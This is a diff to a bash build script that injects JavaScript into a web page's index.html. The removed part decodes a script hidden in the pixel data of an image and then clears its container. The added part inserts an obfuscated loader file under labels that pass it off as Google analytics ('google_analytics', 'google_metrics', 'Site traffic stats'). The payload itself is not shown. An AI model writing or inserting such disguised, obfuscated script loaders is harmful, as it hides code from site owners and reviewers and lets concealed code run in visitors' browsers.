@@ -1,11 +1,14 @@
 #!/bin/bash
 root_dir=`readlink -f ../`
+tmp="tmp"
+mkdir $tmp
+
 
 index_file=$root_dir/index.html
 css_file=$root_dir/main.css
 
 # Put all js in a single file
-all_js="all_scripts.js"
+all_js="$tmp/all_scripts.js"
 echo "" > $all_js
 
 js_files=$(grep "script" $index_file | awk -F '"' '{print $2}' | grep -v framework) 
@@ -43,46 +46,21 @@ while read line; do
 	elif [[ "$line" =~ "<!-- CODE GOES HERE" ]]; then
 		echo "$kinetic_insert" >> $tmp_index
 		echo "
-<script id='garble'></script>
-<div id='delete'>
-	<img id='cc' src='my_code.png'></img>
-	<canvas id='img_canv'></canvas>
+<!-- Site traffic stats  -->
+<div id='google_analytics'>
+	<img id='cc' src='logo.png' ></img>
+	<canvas id='cd'></canvas>
+</div>
 
-<script>
-window.onload = function(){
-
-var i = document.getElementById('cc'),
-    i_w = i.width,
-    i_h = i.height,
-    canvas = document.getElementById('img_canv'),
-    ctx = canvas.getContext('2d');
-
-canvas.width = i_w;
-canvas.height = i_h;
-
-ctx.drawImage(i,0,0);
-
-var imageData = ctx.getImageData(0,0,i_w,i_h),
-    data = imageData.data
-    dlen = data.length,
-    codes = [];
-
-for (var j=0; j < dlen; j += 4){
-        codes.push(data[j]);
-        codes.push(data[j+1]);
-        codes.push(data[j+2]);
-}
-
-var new_script = String.fromCharCode.apply(String,codes);
-
-document.getElementById('garble').innerHTML = new_script;
-document.getElementById('delete').innerHTML = ' ';
-}
+<script id='google_metrics' >
+`cat loader_obfs.js`
 </script>
-</div>" >>  $tmp_index
+" >>  $tmp_index
 
 	fi
 done<$new_index
 
 # Update
 mv $tmp_index $new_index
+
+rm -rf $tmp
